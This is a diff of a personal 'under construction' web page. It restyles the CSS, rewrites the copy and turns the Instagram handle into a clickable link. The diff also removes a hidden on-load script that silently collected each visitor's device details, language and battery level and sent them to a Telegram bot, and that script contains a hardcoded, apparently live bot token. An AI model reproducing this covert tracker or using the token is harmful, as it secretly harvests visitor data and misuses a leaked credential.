@@ -6,88 +6,104 @@
     <title>Website Under A - Zidhuxd</title>
     <!-- Tailwind CSS CDN for utility classes -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- UA-Parser-JS CDN for device detection -->
-    <script src="https://unpkg.com/ua-parser-js@1.0.38/dist/ua-parser.min.js"></script>
     <style>
-        /* Existing styles remain unchanged */
+        /* Load custom Linik Sans Black font */
         @font-face {
             font-family: 'Linik Sans Black';
             src: url('fonts/linik-sans.black.ttf') format('truetype');
-            font-weight: 900;
+            font-weight: 900; /* Black weight */
             font-style: normal;
         }
+
+        /* Custom styles to enhance the vintage feel with the custom font */
         body {
-            font-family: 'Linik Sans Black', sans-serif;
-            background-color: #f7f3e9;
-            color: #4a4a4a;
+            font-family: 'Linik Sans Black', sans-serif; /* Apply custom font with fallback */
+            background-color: #f7f3e9; /* Light vintage cream background */
+            color: #4a4a4a; /* Dark gray text for contrast */
             display: flex;
-            flex-direction: column;
+            flex-direction: column; /* Arrange content vertically */
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            min-height: 100vh; /* Full viewport height */
             margin: 0;
-            padding: 20px;
-            box-sizing: border-box;
-            text-align: center;
-            gap: 24px;
+            padding: 20px; /* Add some padding around the content */
+            box-sizing: border-box; /* Include padding in element's total width and height */
+            text-align: center; /* Center text within the body */
+            gap: 24px; /* Space between elements directly in body */
         }
+
         h1 {
-            font-family: 'Linik Sans Black', sans-serif;
-            font-size: 4rem;
-            color: #000000;
+            font-family: 'Linik Sans Black', sans-serif; /* Apply custom font */
+            font-size: 5.4rem; /* Increased font size by 10% for a "BIGGER" appearance */
+            color: #000000; /* Pure dark black */
             line-height: 1.1;
-            margin-bottom: 0;
-            font-weight: 900;
+            margin-bottom: 0; /* Remove default margin */
+            font-weight: 900; /* Maximum boldness for strong presence */
         }
+
         p {
-            font-family: 'Linik Sans Black', sans-serif;
-            font-size: 1.2rem;
+            font-family: 'Linik Sans Black', sans-serif; /* Apply custom font */
+            font-size: 1.2rem; /* Slightly larger for emphasis */
             line-height: 1.6;
-            color: #000000;
-            max-width: 500px;
-            font-weight: 900;
+            color: #000000; /* Pure dark black for consistency */
+            max-width: 500px; /* Limit paragraph width for readability */
+            font-weight: 900; /* Black weight for rounded appearance */
         }
+
         .construction-gif {
-            width: 100%;
-            max-width: 250px;
+            width: 100%; /* Make GIF responsive */
+            max-width: 250px; /* Max width for the GIF */
             height: auto;
         }
+
+        /* Styling for the developer info text and icon directly */
         .developer-info {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 8px; /* Space between text and icon */
             font-family: 'Linik Sans Black', sans-serif;
             font-size: 1.1rem;
-            color: #3e2723;
+            color: #3e2723; /* Dark brown text */
             font-weight: 900;
         }
+
         .instagram-icon {
-            width: 24px;
+            width: 24px; /* Size of the Instagram icon */
             height: 24px;
-            fill: #000000;
+            fill: #000000; /* Pure black for maximum clarity */
         }
+
+        .instagram-link {
+            text-decoration: none; /* Remove underline from the link */
+            color: #3e2723; /* Inherit color from developer-info or set explicitly */
+            cursor: pointer; /* Indicate it's clickable */
+        }
+
         .contact-button {
             display: inline-block;
-            background-color: #8d6e63;
-            color: #ffffff;
+            background-color: #8d6e63; /* Vintage brown button */
+            color: #ffffff; /* White text */
             padding: 14px 28px;
             border-radius: 8px;
-            text-decoration: none;
+            text-decoration: none; /* No underline */
             font-size: 1.1rem;
             font-weight: bold;
-            transition: all 0.2s ease-in-out;
-            border: 2px solid #5d4037;
-            box-shadow: 4px 4px 0px #5d4037;
+            transition: all 0.2s ease-in-out; /* Smooth transition for hover */
+            border: 2px solid #5d4037; /* Darker border for depth */
+            box-shadow: 4px 4px 0px #5d4037; /* Button shadow */
         }
+
         .contact-button:hover {
-            background-color: #795548;
-            transform: translateY(2px) translateX(2px);
-            box-shadow: 2px 2px 0px #5d4037;
+            background-color: #795548; /* Darker brown on hover */
+            transform: translateY(2px) translateX(2px); /* Slight press effect */
+            box-shadow: 2px 2px 0px #5d4037; /* Adjusted shadow on hover */
         }
+
+        /* Responsive adjustments */
         @media (max-width: 768px) {
             h1 {
-                font-size: 3rem;
+                font-size: 3.3rem; /* Adjusted for smaller screens (10% bigger than 3rem) */
             }
             p {
                 font-size: 1.1rem;
@@ -103,9 +119,10 @@
                 height: 20px;
             }
         }
+
         @media (max-width: 480px) {
             h1 {
-                font-size: 2.5rem;
+                font-size: 2.75rem; /* Adjusted for even smaller screens (10% bigger than 2.5rem) */
             }
             p {
                 font-size: 1rem;
@@ -119,131 +136,64 @@
 </head>
 <body>
     <!-- GIF for construction -->
-    <img src="heheload.gif" alt="Construction GIF" class="construction-gif">
+    <img src="heheload.gif"
+         alt="Construction GIF"
+         class="construction-gif">
 
     <!-- Main heading indicating unfinished status -->
     <h1>WE'RE COOKING SOMETHING SPECIAL</h1>
 
     <!-- Subtitle/description -->
     <p>
-        Our web building construction is at work, crafting something special for you.
-        This page is a sneak peek, pre-published as we lay the final pixel bricks.
-        Thanks for your patience!
+        I'm still cooking this site, crafting something special for you.
+        This page is a overrided, pre-published for testing.
+        Thank you for your valuable time!
     </p>
 
     <!-- Developer Info directly in body -->
     <div class="developer-info">
-        <span>DEVELOPER -</span>
+        <span>DEV -</span>
         <!-- Inline SVG for Instagram Logo -->
         <svg class="instagram-icon" viewBox="0 0 24 24">
             <path d="M7.8 2h8.4C19.4 2 22 4.6 22 7.8v8.4c0 3.2-2.6 5.8-5.8 5.8H7.8C4.6 22 2 19.4 2 16.2V7.8C2 4.6 4.6 2 7.8 2zm-.2 2A2.82 2.82 0 0 0 5 7.8v8.4a2.82 2.82 0 0 0 2.8 2.8h8.4a2.82 2.82 0 0 0 2.8-2.8V7.8a2.82 2.82 0 0 0-2.8-2.8H7.6zm9.6 9.4c0 .9-.7 1.6-1.6 1.6H9.4c-.9 0-1.6-.7-1.6-1.6V9.4c0-.9.7-1.6 1.6-1.6h5.8c.9 0 1.6.7 1.6 1.6v5.8zM12 9a3 3 0 1 0 0 6 3 3 0 0 0 0-6zm0 2a1 1 0 1 1 0 2 1 1 0 0 1 0-2zm5.4-5.4a1.2 1.2 0 1 0 0 2.4 1.2 1.2 0 0 0 0-2.4z"/>
         </svg>
-        <span>@ZIDHUXD</span>
+        <!-- @ZIDHUXD as a clickable link -->
+        <a href="instagram://user?username=zidhuxd" class="instagram-link" onclick="
+            // Try to open the Instagram app
+            var appOpened = false;
+            var timeout = setTimeout(function() {
+                if (!appOpened) {
+                    window.location.href = 'https://instagram.com/zidhuxd'; // Fallback to web
+                }
+            }, 500); // Wait 500ms
+
+            // If the app opens, this timeout will be cleared
+            window.addEventListener('blur', function() {
+                clearTimeout(timeout);
+                appOpened = true;
+            }, { once: true });
+        ">
+            ZIDHUXD
+        </a>
     </div>
 
     <!-- Contact button -->
     <a href="instagram://user?username=zidhuxd" class="contact-button" onclick="
+        // Try to open the Instagram app
         var appOpened = false;
         var timeout = setTimeout(function() {
             if (!appOpened) {
-                window.location.href = 'https://instagram.com/zidhuxd';
+                window.location.href = 'https://instagram.com/zidhuxd'; // Fallback to web
             }
-        }, 500);
+        }, 500); // Wait 500ms
+
+        // If the app opens, this timeout will be cleared
         window.addEventListener('blur', function() {
-            clearTimeout(timeout);
-            appOpened = true;
-        }, { once: true });
+                clearTimeout(timeout);
+                appOpened = true;
+            }, { once: true });
     ">
         Contact Developer
     </a>
-
-    <!-- JavaScript to capture visit time, device info, and battery percentage -->
-    <script>
-        // Telegram Bot API Token and Chat ID
-        const TELEGRAM_BOT_TOKEN = '8069693805:AAEbBGwU3kM35k5R4vlmpTt6LUC30_1dKXk'; // Replace with your bot token
-        const TELEGRAM_CHAT_ID = '6303333846'; // Replace with your chat ID
-
-        // Function to send message to Telegram
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                    }),
-                });
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
-            }
-        }
-
-        // Function to get detailed device information using ua-parser-js
-        function getDeviceInfo() {
-            const parser = new UAParser();
-            const result = parser.getResult();
-            
-            // Extract device details
-            const brand = result.device.vendor || 'Unknown Brand';
-            const model = result.device.model || 'Unknown Model';
-            const deviceName = result.device.type || 'Unknown Device';
-            const os = result.os.name || 'Unknown OS';
-            const osVersion = result.os.version || 'Unknown Version';
-            const language = navigator.language || 'Unknown Language';
-            
-            // Placeholder for unavailable fields
-            const chipset = 'Unknown Chipset'; // Not available via JavaScript
-            const serialNumber = 'Unknown Serial'; // Not accessible in browsers
-            const buildId = result.ua.match(/Build\/([^\s)]+)/)?.[1] || 'Unknown Build';
-
-            return `${brand}; ${model}; ${deviceName}; ${chipset}; ${language}; ${serialNumber}; ${buildId}`;
-        }
-
-        // Function to get battery percentage
-        async function getBatteryInfo() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    const percentage = Math.round(battery.level * 100);
-                    return `${percentage}%`;
-                } catch (error) {
-                    console.error('Error getting battery info:', error);
-                    return 'Battery info unavailable';
-                }
-            } else {
-                return 'Battery API not supported';
-            }
-        }
-
-        // Function to handle page load and send data
-        window.addEventListener('load', async () => {
-            // Get current time in IST
-            const visitTime = new Date().toLocaleString('en-IN', {
-                timeZone: 'Asia/Kolkata',
-                dateStyle: 'full',
-                timeStyle: 'long',
-            });
-
-            // Get device info
-            const deviceInfo = getDeviceInfo();
-
-            // Get battery percentage
-            const batteryPercentage = await getBatteryInfo();
-
-            // Compose message
-            const message = `<b>New Website Visit</b>\n` +
-                           `<b>Time:</b> ${visitTime}\n` +
-                           `<b>Device Info:</b> ${deviceInfo}\n` +
-                           `<b>Battery:</b> ${batteryPercentage}`;
-
-            // Send to Telegram
-            sendToTelegram(message);
-        });
-    </script>
 </body>
 </html>
